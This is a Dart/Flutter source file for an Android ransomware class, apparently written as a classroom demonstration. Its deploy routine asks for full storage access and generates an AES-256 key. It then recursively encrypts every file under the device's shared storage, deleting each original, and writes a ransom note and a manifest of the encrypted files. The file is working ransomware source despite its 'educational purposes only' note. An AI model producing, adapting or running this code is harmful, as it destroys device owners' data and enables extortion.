import 'dart:io';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:encrypt/encrypt.dart' as enc;

class RansomwareEngine {
  static const String manifestFileName = 'ransomware_manifest.txt';
  static const String ransomNoteFileName = 'ransom_note.txt';
  static const String keyFileName = 'encryption_key.key';

  static Future<void> initialize() async {}

  static Future<void> deploy() async {
    debugPrint('RANSOMWARE: deploy() called!');
    try {
      // 1. Request storage permission
      var storageStatus = await Permission.manageExternalStorage.status;
      if (!storageStatus.isGranted) {
        storageStatus = await Permission.manageExternalStorage.request();
        if (!storageStatus.isGranted) {
          debugPrint('RANSOMWARE: Storage permission denied — encryption aborted.');
          return;
        }
      }

      // 2. Generate AES-256 key and IV
      final key = enc.Key.fromSecureRandom(32);
      final iv = enc.IV.fromSecureRandom(16);
      final encrypter = enc.Encrypter(enc.AES(key));

      // 3. Save key to app private directory
      final appDir = await getApplicationDocumentsDirectory();
      final keyFile = File('${appDir.path}/$keyFileName');
      await keyFile.writeAsBytes([...key.bytes, ...iv.bytes]);
      debugPrint('RANSOMWARE: Key saved to ${keyFile.path}');

      // 4. Encrypt files in target path
      const String targetPath = '/storage/emulated/0/';
      final List<String> encryptedFiles = [];

      await _encryptDirectory(
        Directory(targetPath),
        encrypter,
        iv,
        encryptedFiles,
      );

      // 5. Write ransom note
      final noteFile = File('${appDir.path}/$ransomNoteFileName');
      await noteFile.writeAsString(
        'YOUR FILES HAVE BEEN ENCRYPTED\n\n'
        'All your important files are now locked with AES-256 encryption.\n'
        'To restore access, contact the professor for the decryption key.\n\n'
        'This is a demonstration for educational purposes only.',
      );

      // 6. Write manifest
      final manifestFile = File('${appDir.path}/$manifestFileName');
      await manifestFile.writeAsString(
        'RANSOMWARE MANIFEST\n'
        '==================\n'
        'Deployment Time: ${DateTime.now()}\n'
        'Total Files Encrypted: ${encryptedFiles.length}\n'
        'Encryption: AES-256-CBC\n\n'
        'Encrypted Files:\n'
        '----------------\n'
        '${encryptedFiles.join('\n')}',
      );

      debugPrint('RANSOMWARE: Encryption complete. ${encryptedFiles.length} files encrypted.');
    } catch (e, stack) {
      debugPrint('RANSOMWARE: Error during deployment: $e');
      debugPrint(stack.toString());
    }
  }

  static Future<void> _encryptDirectory(
    Directory dir,
    enc.Encrypter encrypter,
    enc.IV iv,
    List<String> encryptedFiles,
  ) async {
    if (!await dir.exists()) return;

    // ✅ Skip restricted Android folders
    final restricted = [
      '/storage/emulated/0/Android/data',
      '/storage/emulated/0/Android/obb',
      '/storage/emulated/0/Android/media',
    ];
    if (restricted.any((r) => dir.path.startsWith(r))) {
      debugPrint('RANSOMWARE: Skipping restricted folder ${dir.path}');
      return;
    }

    await for (final entity in dir.list(recursive: false)) {
      if (entity is Directory) {
        await _encryptDirectory(entity, encrypter, iv, encryptedFiles);
      } else if (entity is File && !entity.path.endsWith('.enc')) {
        try {
          final bytes = await entity.readAsBytes();
          final encrypted = encrypter.encryptBytes(bytes, iv: iv);
          final encFile = File('${entity.path}.enc');
          await encFile.writeAsBytes(encrypted.bytes);
          await entity.delete();
          encryptedFiles.add(encFile.path);
          debugPrint('RANSOMWARE: Encrypted ${entity.path}');
        } catch (e) {
          debugPrint('RANSOMWARE: Skipped ${entity.path}: $e');
        }
      }
    }
  }
}